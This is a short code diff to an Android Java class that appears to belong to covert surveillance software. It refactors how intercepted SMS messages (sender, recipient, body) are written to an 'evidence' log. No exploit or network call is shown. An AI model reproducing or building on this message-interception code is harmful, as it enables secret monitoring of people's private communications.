@@ -14,13 +14,13 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.Iterator;
 
-import com.android.networking.LogR;
 import com.android.networking.Messages;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ChildConf;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.conf.ConfigurationException;
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.evidence.LogR;
 import com.android.networking.evidence.Markup;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerSms;
@@ -385,7 +385,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		databuffer.write(ByteArray.padByteArray(from.getBytes(), 16));
 		databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
 
-		new LogR(EvidenceType.SMS_NEW, additionalData, body);
+		LogR.atomic(EvidenceType.SMS_NEW, additionalData, body);
 	}
 
 	public int notification(Sms s) {
